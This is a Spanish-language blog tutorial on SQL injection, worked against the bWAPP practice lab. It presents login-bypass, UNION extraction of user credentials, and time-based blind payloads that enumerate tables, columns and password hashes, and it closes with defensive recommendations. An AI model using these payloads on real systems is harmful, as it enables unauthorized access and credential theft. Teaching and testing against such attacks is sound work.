---
date: 2023-01-13T00:50:05.000Z
layout: post
comments: true
title: SQL Inject
subtitle: 'tipos de inyecciones'
description: >-
image: >-
    http://imgfz.com/i/IUcxZsb.png
optimized_image: >-
    http://imgfz.com/i/IUcxZsb.png
category: ciberseguridad
tags: 
  - hacking
  - exploit
  - vulnerabilidad
  - reflejado
  - Consultas
  - XML
  - Union
  - Boolean
  - Based
  - Limit
  - Time-Based
  - Order
  - Blind
  - ASCII
author: Felipe Canales Cayuqueo
paginate: true
---

Los ataques de inyección SQL permiten a un usuario no autorizado tomar el control de las sentencias SQL utilizadas por una aplicación web, con el fin de obtener datos como por ejemplo:

* Credenciales de usuario;
* Información de la aplicación web;
* Números de tarjetas de créditos;
* Datos de transacciones;
* Correos electrónicos;
* Números de teléfono;
* entre muchos otros datos.

Esta vulnerabilidad se puede encontrar en:

* Parámetros GET.
* Parámetros POST.
* Encabezados HTTP.
  * User-Agent.
  * Cookies.
  * Accept.
  * Entre otros.
 
### Consultas dinámicas vulnerables

A continuación se presentan consultas vulnerables, iniciando por el código que utiliza la entrada proporcionada por el usuario para construir una query (el parámetro id de la petición GET). Luego el código envía la consulta a la base de datos. Este comportamiento es muy peligroso porque un usuario malicioso puede explotar la construcción de la consulta para tomar el control de la interacción con la base de datos.

```sql
$id = $_GET['id'];
```

```php
$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='$id';";

$results = mysqli_query($connection, $query);
display_results($results);
```

Para esta situación un atacante podría alterar la consulta, inyectando el siguiente parámetro en ID:

```sql
' OR 'a'='a
```

o también podría ser:

```sql
' OR '1'='1
```

Lo que provocaría en la consulta es lo siguiente:

```sql
SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
```

En este caso indica a la base de datos que seleccione los elementos comprobando dos condiciones:

* El ID debe estar vacío (id='').
* OR es una condición siempre verdadera ('a'='a').

Mientras no se cumpla la primera condición, el motor SQL considerará la segunda condición del OR. Esta segunda condición es una condición siempre verdadera, en otras palabras, indica a la base de datos que seleccione todos los elementos de la tabla ```Products```.

Este tipo de explotaciones se pueden realizar de diversas formas por ejemplo si ocupamos una inyección con UNION como la siguiente:

```sql
' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
```

El resultado del cambio de la consulta original sería el siguiente:

```sql
SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

El ejemplo reciente con UNION pide a la base de datos que seleccione los elementos con un id vacío, seleccionando así un conjunto vacío, y la realización de una unión con todas las entradas de la tabla ```Accounts```.

Utilizando algunos conocimientos profundos sobre las funciones de los sistemas de gestión de bases de datos, un atacante puede obtener acceso a toda la base de datos simplemente utilizando una aplicación web como vector de ataque.

A continuación se presenta una prueba de concepto con una web distinta al ejemplo reciente pero que demuestra esta vulnerabilidad.

#### Proof of Concept (PoC)

Si en una aplicación web realizamos una comilla simple obtendremos el error que indicaría que es vulnerable:

![sqlinjectpoc1test](/images/sqlinjectpoc1test.png)

Luego si ocupamos la inyección anteriormente mencionada obtendremos lo siguiente:

![sqlinjectpoc1all](/images/sqlinjectpoc1all.png)


### SQL Injection Login ByPass (Boolean Based)

Un SQL inject boolean based es un tipo de ataque de SQL injection en el que el atacante envía una consulta a la base de datos que contiene una condición booleana (verdadero o falso). La respuesta de la base de datos indica si la condición es verdadera o falsa, lo que permite al atacante deducir información sobre la estructura y los datos de la base de datos.

Primero realizamos la comprobación de la vulnerabilidad:

![sqlinjectloginbypass1](/images/sqlinjectloginbypass1.png)

Una vez se detecta que es el login es vulnerable, debemos suponer la consulta que pasa por detrás del panel de autenticación, en este caso puede ser:

```sql
SELECT userid FROM users WHERE user='admin' AND pass='password';
```

Por lo tanto deberiamos aplicar el siguiente cambio a la consulta original:

```sql
SELECT userid FROM users WHERE user='' OR '1'='1' AND pass='' OR '1'='1'
```

Es decir aplicamos en el campo de ```user```, si conocieramos el nombre de usuario lo siguiente:

```sql
admin' OR '1'='1
```

Y en el campo de ```pass```:

```sql
' OR '1'='1

-- Si no conocieramos el nombre de usuario, iría lo mismo y considerará el primer usuario de la tabla
```

![sqlinjectloginbypass2](/images/sqlinjectloginbypass2.png)

Finalmente obtenemos acceso como admin:

![sqlinjectloginbypass3](/images/sqlinjectloginbypass3.png)


### Identificar número de columnas

Un SQL inject que utiliza la cláusula ```ORDER BY``` es un tipo de ataque de SQL injection en el que el atacante intenta identificar el número de columnas en una tabla de una base de datos. El atacante envía una consulta a la base de datos con una cláusula ORDER BY y un número de columna específico, y observa cómo la aplicación web responde a la consulta. Si la aplicación no muestra ningún error, el atacante sabe que la columna existe y puede intentar inyectar otra consulta para obtener más información sobre la tabla.

```sql
test' order by 10-- -
```

![sqlinjectidentifycolumns2](/images/sqlinjectidentifycolumns2.png)

```sql
test' order by 8-- -
```

![sqlinjectidentifycolumns3](/images/sqlinjectidentifycolumns3.png)

```sql
test' order by 7-- -
```

![sqlinjectidentifycolumns4](/images/sqlinjectidentifycolumns4.png)

Por lo tanto en esta prueba, se detectaron 7 columnas.

### SQL Injection UNION Attack

Es un tipo de ataque de SQL injection en el que el atacante inyecta código malicioso en una consulta SQL que utiliza la cláusula ```UNION```. La cláusula ```UNION``` permite combinar el resultado de dos o más consultas ```SELECT``` en una sola tabla. El atacante puede utilizar una consulta de UNION para inyectar código malicioso en la base de datos y obtener información no autorizada o realizar acciones no autorizadas.

Podemos empezar a descubrir el nombre de las tablas, sin antes destacar que se agrega ```table_schema``` para que no enumere todas las tablas de las distintas bases de datos, sin embargo en esta ocasión como solo hay una, se escribe ```database()```, si hubieran más simplemente se debe reemplazar lo anterior por el nombre de la base de datos correspondiente.

```sql
test' UNION SELECT 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()-- -
```

![sqlinjectunionattack1](/images/sqlinjectunionattack1.png)

Una vez obtenemos las tablas, procedemos a ver las columnas de la tabla ```users```:

```sql
test' union select 1,column_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' AND table_schema=database()-- -
```

![sqlinjectunionattack2](/images/sqlinjectunionattack2.png)

Ya teniendo toda esa información como base podemos ingresar a la información de las columnas:

```sql
test' union select 1,login,password,email,secret,7 FROM users-- -
```

![sqlinjectunionattack3](/images/sqlinjectunionattack3.png)

#### BurpSuite (Union Attack)

Para el caso de BurpSuite, una vez interceptamos la petición, detectaremos "title", que es desde donde se realizará la inyección:

![sqlinjectunionattackburp1](/images/sqlinjectunionattackburp1.png)

Antes de envíar la petición modificada, hay convertir la inyección a URL encode de la siguiente forma:

![sqlinjectunionattackburp2](/images/sqlinjectunionattackburp2.png)

![sqlinjectunionattackburp3](/images/sqlinjectunionattackburp3.png)

Finalmente se envía y en la respuesta se podrá apreciar toda la información solicitada:

![sqlinjectunionattackburp4](/images/sqlinjectunionattackburp4.png)


### Limitación de resultados

En algunas situaciones la inyección no permite mostrar toda la información en una sola consulta, por lo que debemos limitar la respuesta para ir de una en una, de la siguiente forma:

```sql
test' union select 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() LIMIT 0,1-- -
```

Con esto se obtiene la primera tabla de la base de datos, que en para este caso es ```blog```:

![sqlinjectlimit1](/images/sqlinjectlimit1.png)

A continuación obtendremos la segunda tabla que es ```heroes```

```sql
test' union select 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() LIMIT 1,1-- -
```

![sqlinjectlimit2](/images/sqlinjectlimit2.png)

Este proceso seguirá hasta que lleguemos a una tabla que se considere sensible, como el siguiente caso:

```sql
test' union select 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() LIMIT 3,1-- -
```

![sqlinjectlimit3](/images/sqlinjectlimit3.png)

Este mismo proceso se puede realizar para buscar bases de datos, tablas, columnas o la información contenidas en ellas.

### Recuperación de múltiples valores en una columna

Para los siguientes ejemplo lo que se busca realizar es seleccionar todos los datos de la tabla users y concatenarlos en una sola cadena para obtener el nombre de usuario, la contraseña, el secreto y el correo electrónico de cada usuario en la base de datos. Este prcoeso se puede realizar para obtener datos de tablas, columnas, entre otros.

![sqlinjectretornoenunacolumna1](/images/sqlinjectretornoenunacolumna1.png)

```sql
test' union select 1,concat(login,':',password,':',secret,':',email),3,4,5,6,7 FROM users-- -
```

Otra opción podría ser lo siguiente pero no siempre funciona:

```sql
test' union select 1,login||':'||password||':'||secret||':'||email,3,4,5,6,7 FROM users-- -
```

### Detección de versión

La detección de versiones a través de una inyección es importante para encontrar vulnerabilidades conocidas en esa versión específica, lo que provoca que se encuentren más vectores potenciales de ataque.

```sql
test' UNION SELECT 1,@@version,3,4,5,6,7-- -
```

![sqlinjectversiondetect](/images/sqlinjectversiondetect.png)

### SQL Injection Blind Attack (Time-Based)

El Blind SQL Injection es aquella aplicacion web en donde no se ve el error en la respuesta tras la inyección. En esta ocasión se ocupará el parámetro ```SLEEP()```, para conocer información de la base de datos. Esto último hace referencia a lo que se conoce como "Time-Based", en que en lugar de obtener una respuesta inmediata, el atacante hace uso de una técnica de "atraso" o "temporización" para determinar si la consulta fue exitosa, lo que dificulta la detección del ataque.

Primero identificamos la vulnerabilidad, en este caso hay diversas formas de identificarlo, pero para esta situación ocuparemos la siguiente inyección:

```sql
iron man' AND sleep(5)-- -
```

![sqlinjectblindsleep1](/images/sqlinjectblindsleep1.png)

Se detectan 5 segundos de espera antes de que cargue la página, lo que confirma la vulnerabilidad:

![sqlinjectblindsleep2](/images/sqlinjectblindsleep2.png)


Tras confirmar la vulnerabilidad, podemos comenzar a buscar el nombre de la base de datos, esto se realiza por medio de la siguiente inyección:

```sql
iron man' AND substring(database(),1,1)='a' AND sleep(5)-- -
```

![sqlinjectblindsleep3](/images/sqlinjectblindsleep3.png)

intentamos con la letra "a", sin embargo la web nos responde prácticamente de forma inmediata la respuesta:

![sqlinjectblindsleep4](/images/sqlinjectblindsleep4.png)

Esto indica que el nombre de la base de datos buscada no inicia con la letra "a", es decir, si esta no respeta el tiempo de "sleep" asociado, entonces significa que la letra no corresponde. Entonces como para el primer caso no funciona podemos seguir viendo con la siguiente letra:

```sql
iron man' AND substring(database(),1,1)='b' AND sleep(5)-- -
```

![sqlinjectblindsleep5](/images/sqlinjectblindsleep5.png)

![sqlinjectblindsleep6](/images/sqlinjectblindsleep6.png)

En este caso funciona según lo esperado el proceso, por lo tanto el nombre de la base de datos comienza con la letra 'b'. De esta misma forma seguiriamos probando así sucesivamente considerando; minúsculas, mayúsculas, números, entre otros, hasta encontrar el nombre de la base de datos completa que sería ```bWAPP```.

```sql
iron man' AND substring(database(),2,1)='W' AND sleep(5)-- -
```

![sqlinjectblindsleep7](/images/sqlinjectblindsleep7.png)

```sql
iron man' AND substring(database(),3,1)='A' AND sleep(5)-- -
```

![sqlinjectblindsleep8](/images/sqlinjectblindsleep8.png)

```sql
iron man' AND substring(database(),4,1)='P' AND sleep(5)-- -
```

![sqlinjectblindsleep9](/images/sqlinjectblindsleep9.png)

```sql
iron man' AND substring(database(),5,1)='P' AND sleep(5)-- -
```

![sqlinjectblindsleep10](/images/sqlinjectblindsleep10.png)

Ahora para encontrar los nombres de las tablas se realiza la siguiente inyección, en donde nos centraremos en encontrar la tabla ```users``` que se vió anteriormente:

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),1,1) = 'u' AND sleep(5)-- -
```

![sqlinjectblindsleep11](/images/sqlinjectblindsleep11.png)

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),2,1) = 's' AND sleep(5)-- -
```

![sqlinjectblindsleep12](/images/sqlinjectblindsleep12.png)

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),3,1) = 'e' AND sleep(5)-- -
```

![sqlinjectblindsleep13](/images/sqlinjectblindsleep13.png)

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),4,1) = 'r' AND sleep(5)-- -
```

![sqlinjectblindsleep14](/images/sqlinjectblindsleep14.png)

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),5,1) = 's' AND sleep(5)-- -
```

![sqlinjectblindsleep15](/images/sqlinjectblindsleep15.png)

#### Opción ocupando ASCII

```sql
' or 1=1 AND ASCII(substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),1,1)) = 117 AND sleep(5)-- -
```

Si quisieramos buscar otra tabla sería por medio de las siguientes inyecciones (En este caso se busca la tabla "heroes"):

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),1,1) = 'h' AND sleep(5)-- -
```

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),2,1) = 'e' AND sleep(5)-- -
```

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),3,1) = 'r' AND sleep(5)-- -
```

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),4,1) = 'o' AND sleep(5)-- -
```

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),5,1) = 'e' AND sleep(5)-- -
```

```sql
' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),6,1) = 's' AND sleep(5)-- -
```

#### Opción ocupando ASCII

```sql
' or 1=1 AND ASCII(substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 1,1),1,1)) = 104 AND sleep(5)-- -
```

Una vez encontramos una tabla sensible en la cual centrarnos, podemos buscar sus columnas de la siguiente forma (en este caso la columna encontrada es ```password```):

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),1,1) = 'p' AND sleep(5)-- -
```

![sqlinjectblindsleep16](/images/sqlinjectblindsleep16.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),2,1) = 'a' AND sleep(5)-- -
```

![sqlinjectblindsleep17](/images/sqlinjectblindsleep17.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),3,1) = 's' AND sleep(5)-- -
```

![sqlinjectblindsleep18](/images/sqlinjectblindsleep18.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),4,1) = 's' AND sleep(5)-- -
```

![sqlinjectblindsleep19](/images/sqlinjectblindsleep19.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),5,1) = 'w' AND sleep(5)-- -
```

![sqlinjectblindsleep20](/images/sqlinjectblindsleep20.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),6,1) = 'o' AND sleep(5)-- -
```

![sqlinjectblindsleep21](/images/sqlinjectblindsleep21.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),7,1) = 'r' AND sleep(5)-- -
```

![sqlinjectblindsleep22](/images/sqlinjectblindsleep22.png)

```sql
' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),8,1) = 'd' AND sleep(5)-- -
```

![sqlinjectblindsleep23](/images/sqlinjectblindsleep23.png)

#### Opción ocupando ASCII

```sql
' or 1=1 AND ASCII(substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),1,1)) = 112 AND sleep(5)-- -
```

Este proceso se puede realizar para encontrar cualquier columna, como por ejemplo encontrar "login". Ahora si se quiere ver el contenido en este caso de la tabla ```users```, hacemos lo siguiente para la columna ```login```:

```sql
' or 1=1 AND substring((SELECT login FROM users LIMIT 1,1),1,1) = 'b' AND sleep(5)-- -
```

![sqlinjectblindsleep24](/images/sqlinjectblindsleep24.png)

```sql
' or 1=1 AND substring((SELECT login FROM users LIMIT 1,1),2,1) = 'e' AND sleep(5)-- -
```

![sqlinjectblindsleep25](/images/sqlinjectblindsleep25.png)

```sql
' or 1=1 AND substring((SELECT login FROM users LIMIT 1,1),3,1) = 'e' AND sleep(5)-- -
```

![sqlinjectblindsleep26](/images/sqlinjectblindsleep26.png)

y para el caso de ```password``` sería de la siguiente forma:

```sql
' or 1=1 AND substring((SELECT password FROM users LIMIT 1,1),1,1) = '6' AND sleep(5)-- -
```

![sqlinjectblindsleep27](/images/sqlinjectblindsleep27.png)

Pero como sería mucho más largo el hash, simplemente se muestra uno como ejemplo referecial.

#### Opción ocupando ASCII

```sql
' or 1=1 AND ASCII(substring((SELECT login FROM users LIMIT 1,1),1,1)) = 98 AND sleep(5)-- -
```

### SQL Injection Stored (XML)

Es un tipo de ataque de inyección SQL en el cual el atacante inserta código malicioso en una consulta SQL almacenada en una aplicación web, permitiéndole ejecutar comandos arbitrarios en la base de datos. A diferencia de una inyección SQL tradicional, que suele ser utilizada para obtener información o realizar cambios en una base de datos, una inyección SQL XML almacenada permite al atacante escribir y almacenar su propio código malicioso en la base de datos, lo que puede permitirle realizar acciones más avanzadas, como la creación de usuarios maliciosos o la modificación de datos críticos.

Para el ejemplo que vermeos a continuación se intercepta la petición con BurpSuite y se hace click en la unica opción presente:

![sqlinjectxml1](/images/sqlinjectxml1.png)

Recibimos lo siguiente en BurpSuite:

![sqlinjectxml0](/images/sqlinjectxml0.png)

Y en la siguiente sección, comprobaremos la vulnerabilidad:

```xml
<login>
  bee
</login>
```

Esta se comprueba de la siguiente forma:

![sqlinjectxmlvuln1](/images/sqlinjectxmlvuln1.png)

Y como se puede aprecia se detecta la vulnerabilidad

![sqlinjectxmlvuln2](/images/sqlinjectxmlvuln2.png)

Por este mismo medio, se pueden inyectar consultas vistas anteriormente como por ejemplo la siguiente, en que se detectará en BurpSuite el tiempo de espera de 5 segundos:

![sqlinjectxml2](/images/sqlinjectxml2.png)

Para obtener finalmente como respuesta la inyección insertada:

![sqlinjectxml3](/images/sqlinjectxml3.png)


### Recomendaciones

* Utilizar parámetros en lugar de construir consultas dinámicamente es una de las mejores maneras de evitar una inyección SQL. Los parámetros permiten que los datos sean separados del código, lo que impide que los atacantes inyecten código malicioso en las consultas.

* Es importante validar y sanitizar todas las entradas del usuario antes de utilizarlas en una consulta SQL. Esto incluye la eliminación de caracteres no deseados, como comillas y barras invertidas, y la validación de que los datos se ajustan a los tipos de datos esperados.

* Utilizar un sistema de permisos y roles para controlar el acceso a las bases de datos es una excelente manera de evitar una inyección SQL. Los usuarios y aplicaciones solo deben tener acceso a las bases de datos y tablas que realmente necesitan.

* Existen varias herramientas disponibles que pueden ayudar a detectar y prevenir las inyecciones SQL, como las herramientas de escaneo de aplicaciones web y las soluciones de seguridad de bases de datos.

* Mantener actualizado el sistema y las aplicaciones es importante para evitar que los atacantes exploten vulnerabilidades conocidas. Es importante mantener actualizado el sistema operativo, las bases de datos y las aplicaciones web que se ejecutan en el sistema.

* Utilizar WAF (Firewall de Aplicación Web) estas son herramientas de seguridad especializadas que pueden ayudar a protegerse contra las inyecciones SQL y otras vulnerabilidades web.
